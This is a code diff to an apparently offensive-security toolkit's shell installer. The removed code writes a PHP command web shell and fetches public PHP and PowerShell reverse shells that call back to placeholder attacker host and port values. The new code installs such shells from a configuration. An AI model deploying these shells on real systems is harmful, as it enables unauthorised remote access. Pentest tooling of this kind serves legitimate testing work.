@@ -5,88 +5,136 @@
 # Further license information at end of file
 
 
+import os
 import requests
 import logging
-import os
-import gzip
 import subprocess
-import shutil
+
+from os.path import join, abspath
 
 
-def install_php_shells(php_shell_dir, ignore_errors=False):
-    os.makedirs(php_shell_dir, exist_ok=True)
-    old_cwd = os.getcwd()
-    # Need to chdir to get relative instead of absolute symlinks
-    os.chdir(php_shell_dir)
+def install_shell(init_source, shell_dir, name, location, shell_type, source_path="", install_subdir="", search_and_replace=[], postfix=""):
+    """ Install a shell to the shell directory. Please note that this currently
+        only supports text files, not binary.
 
-    shell_alias_extensions = ["php4", "php5", "phtml"]
+        init_source: str
+            The directory containing optinit.
+        shell_dir: str
+            The shell directory to install to.
+        name: str
+            The literal file name for the shell. Used for both finding local
+            files if source_path is not provided and the final name for
+            installation.
+        shell_type: str
+            Currently only used to determine whether to place at shell_dir or
+            join(shell_dir, "original").
+        location: str
+            "remote" or "local"
+            Remote files expect source_path to be a URL. Local files are assumed
+            to be located at join(init_source, "shell", name) unless source_path
+            is present.
+        source_path: str
+            For remote files, the remote URL to download using requests.get().
+            For local files, override the default local location.
+        install_subdir: str
+            An optional subdirectory of shell_dir. Applied AFTER the modifier
+            from shell_type. (shell_dir for normal shells, join(shell_dir,
+            "original") for reverse shells)
+        search_and_replace: list
+            A 2-index list which will have each set of values passed to
+            str.replace() for the file's text. Most commonly used to place
+            REPLACEME_LHOST and REPLACEME_LPORT.
+        postfix: str
+            A literal string to be appended to the file data. Added after
+            search_and_replace is applied.
+    """
 
-    # Command shells are so simple that packaging them separately is overkill
-    with open("cmd.php", "w") as f:
-        f.write('<?php shell_exec($_GET["cmd"]; ?>\n')
+    # Check for invalid location or source_path value
+    # Apply default source_path, if applicable
+    if location == "local":
+        if not source_path:
+            source_path = join(init_source, "shell", name)
+    elif location == "remote":
+        if not source_path:
+            logging.error(f"No source path for remote shell \"{name}\"")
+            return False
+    else:
+        logging.error(f"Invalid shell location \"{location}\"")
+        return False
 
-    # Create aliases with different file extensions
-    for shell_alias_ext in shell_alias_extensions:
-        os.symlink("cmd.php", f"cmd.{shell_alias_ext}")
+    # Apply default install_subdir
+    if not install_subdir:
+        install_subdir = ""
 
-    # Fetch and process the reverse shell
-    php_reverse_shell_contents = requests.get("https://github.com/pentestmonkey/php-reverse-shell/raw/8aa37ebe03d896b432c4b4469028e2bed75785f1/php-reverse-shell.php").text
-    php_reverse_shell_contents = php_reverse_shell_contents.replace("$ip = '127.0.0.1';  // CHANGE THIS", "$ip = 'REPLACEME_LHOST';")
-    php_reverse_shell_contents = php_reverse_shell_contents.replace("$port = 1234;       // CHANGE THIS", "$port = REPLACEME_LPORT;")
+    # If install_subdir is a list, turn it into a path string
+    if type(install_subdir) is list:
+        install_subdir = join(*install_subdir)
 
-    with open("php-reverse-shell.php", "w") as f:
-        f.write(php_reverse_shell_contents)
+    # Apply shell_type path modifier
+    if shell_type == "reverse":
+        install_subdir = join("original", install_subdir)
 
-    for shell_alias_ext in shell_alias_extensions:
-        os.symlink("php-reverse-shell.php", f"php-reverse-shell.{shell_alias_ext}")
+    # Ensure the installation path exists
+    install_path = abspath(join(shell_dir, install_subdir))
+    os.makedirs(install_path, exist_ok=True)
 
-    os.chdir(old_cwd)
+    # Create the final file path name
+    install_name = abspath(join(install_path, name))
+
+    logging.debug(f"Installing shell {name} from {source_path} to {install_name}")
+
+    # Get file text from source path
+    if location == "local":
+        file_text = open(source_path).read()
+    elif location == "remote":
+        file_text = requests.get(source_path).text
+    else:
+        logging.error(f"location is no longer a valid value: {location}")
+        return False
+
+    # Process text replacement
+    for entry in search_and_replace:
+        file_text.replace(entry[0], entry[1])
+
+    # Write final shell to output file
+    with open(install_name, "w") as shell_file:
+        shell_file.write(file_text)
+        if postfix:
+            shell_file.write(postfix)
+        shell_file.close()
+
+    return True
 
 
-def install_python_pty_shells(shell_dir, ignore_errors=False):
-    old_cwd = os.getcwd()
-    os.chdir(shell_dir)
+def install_shells(init_source, shell_dir, shell_params, local_only=False, ignore_errors=False):
+    os.makedirs(join(shell_dir, "original"), exist_ok=True)
 
-    if not os.path.isdir(os.path.join(shell_dir, "python-pty-shells")):
-        subprocess.run(["git", "clone", "https://github.com/infodox/python-pty-shells"], stderr=subprocess.DEVNULL)
+    for name, shell_data in shell_params.items():
+        if shell_data.get("location") != "local" and local_only:
+            logging.debug(f"Skipping non-local shell {name}")
+            continue
 
-    os.chdir(old_cwd)
+        try:
+            success = install_shell(init_source = init_source,
+                                    shell_dir = shell_dir,
+                                    name = name,
+                                    location = shell_data["location"],
+                                    shell_type = shell_data.get("shell_type"),
+                                    source_path = shell_data.get("source_path"),
+                                    install_subdir = shell_data.get("install_subdir"),
+                                    search_and_replace = shell_data.get("search_and_replace", []),
+                                    postfix = shell_data.get("postfix")
+                                   )
+        except KeyError as e:
+            logging.error(f"Missing required shell parameter for {name}: {e}")
+            success = False
+        except requests.RequestException as e:
+            logging.error(f"Encountered an error during a request while installing shell {name}: {e}")
+            success = False
 
+        if (not success) and (not ignore_errors):
+            return 1
 
-def install_shell(install_dir, ignore_errors=False):
-    shell_dir = os.path.join(install_dir, "shell")
-    original_dir = os.path.join(shell_dir, "original")
-    os.makedirs(original_dir, exist_ok=True)
-    old_cwd = os.getcwd()
-
-    install_php_shells(os.path.join(original_dir, "php"), ignore_errors)
-    install_python_pty_shells(original_dir, ignore_errors)
-
-    # Install reverse shells to shell/original
-    reverse_shells = ["web.config"]
-    for reverse_shell in reverse_shells:
-        shutil.copy2(os.path.join("shell", reverse_shell), original_dir)
-
-    # Add shell command to nishang reverse shell
-    with open(os.path.join(original_dir, "Invoke-PowerShellTcp.ps1"), "w") as f:
-        f.write(requests.get("https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1").text)
-        f.write("\nInvoke-PowerShellTcp -Reverse -IPAddress REPLACEME_LHOST -Port REPLACEME_LPORT\n")
-
-    # Install non-reverse shell to shell
-    file_shells = ["cmd.aspx", "setuid.c"]
-    for file_shell in file_shells:
-        shutil.copy2(os.path.join("shell", file_shell), shell_dir)
-
-    # Get unicorn
-    unicorn_path = os.path.join(shell_dir, "unicorn.py")
-    with open(unicorn_path, "w") as f:
-        f.write(requests.get("https://raw.githubusercontent.com/trustedsec/unicorn/master/unicorn.py").text)
-    os.chmod(unicorn_path, 0o755)
-
-    # Initialize with a placeholder IP and port
-    subprocess.run(["/bin/bash", os.path.join(install_dir, "userbin", "set_host_port.sh"), "127.0.0.1", "4444"])
-
-    os.chdir(old_cwd)
     return 0
 
 
